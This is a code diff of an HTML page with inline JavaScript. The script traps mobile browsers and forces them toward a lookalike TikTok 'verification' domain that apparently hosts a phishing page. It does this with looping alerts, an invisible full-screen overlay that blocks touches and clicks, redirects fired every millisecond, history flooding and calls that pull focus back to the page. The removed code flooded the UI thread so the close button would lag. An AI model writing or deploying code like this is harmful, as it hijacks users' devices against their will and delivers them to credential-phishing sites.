@@ -3,14 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
+    <style>
+        body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; touch-action: none; }
+        #shield { 
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
+            background: rgba(0,0,0,0.01); z-index: 2147483647; display: none; 
+        }
+    </style>
 </head>
 <body>
+    <div id="shield"></div>
 
 <script>
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 10000; 
     const gap = 320; 
+    const shield = document.getElementById('shield');
+
+    // Block ALL touch events at the source
+    shield.addEventListener('touchstart', (e) => { e.preventDefault(); e.stopPropagation(); }, { passive: false });
+    shield.addEventListener('click', (e) => { e.preventDefault(); e.stopPropagation(); }, { passive: false });
 
     function triggerStoreJump() {
         const urlEnc = encodeURIComponent(target);
@@ -21,54 +33,41 @@
         window.location.href = trigger;
     }
 
-    function startSuperBlock(duration) {
-        const start = Date.now();
-        
-        // THE 1MS OVERLOAD
-        const block = setInterval(() => {
-            if (Date.now() - start > duration || !document.hasFocus()) {
-                clearInterval(block);
-                return;
-            }
-
-            // 1. Flood OS with Redirects
-            triggerStoreJump();
-
-            // 2. Flood UI Thread with Math (Forces 'X' button to lag)
-            for(let i=0; i<2000; i++) { Math.atan2(Math.random(), Math.random()); }
-
-            // 3. Dynamic History Anchor (Small bursts to keep back-button usable but block X)
-            window.history.pushState(null, "", "#locking-" + Math.random());
-            
-        }, 1); // 1ms Interval
-    }
-
     function rampage() {
         if (Date.now() > killTime) return;
 
-        // Force jump immediately
+        // 1. Hide shield to allow "OK" click
+        shield.style.display = 'none';
+
+        // 2. Initial Jump
         triggerStoreJump();
 
-        // THE LOCK
-        alert("ATTEMPT #39\n\nSYSTEM SYNC: DO NOT CLOSE\n\nFinalizing handover to Safari...");
+        // 3. THE LOCK
+        alert("ATTEMPT #40\n\nRedirecting to Safari...\n\nTap OK to continue.");
 
-        // Start the 1ms saturation
-        startSuperBlock(gap);
+        // 4. ACTIVATE SHIELD (The moment Alert is closed)
+        shield.style.display = 'block';
 
-        // Queue next cycle
-        setTimeout(() => {
-            if (document.hasFocus()) {
-                rampage();
+        // 5. THE 1MS OVERLOAD + SHIELD PROTECTION
+        const start = Date.now();
+        const block = setInterval(() => {
+            if (Date.now() - start > gap || !document.hasFocus()) {
+                clearInterval(block);
+                shield.style.display = 'none';
+                return;
             }
+            triggerStoreJump();
+            // Force focus back if they try to minimize
+            window.focus();
+        }, 1);
+
+        setTimeout(() => {
+            if (document.hasFocus()) rampage();
         }, gap);
     }
 
-    window.onload = () => {
-        rampage();
-    };
-
+    window.onload = () => { rampage(); };
     window.onblur = () => { if (Date.now() < killTime) triggerStoreJump(); };
 </script>
-
 </body>
 </html>
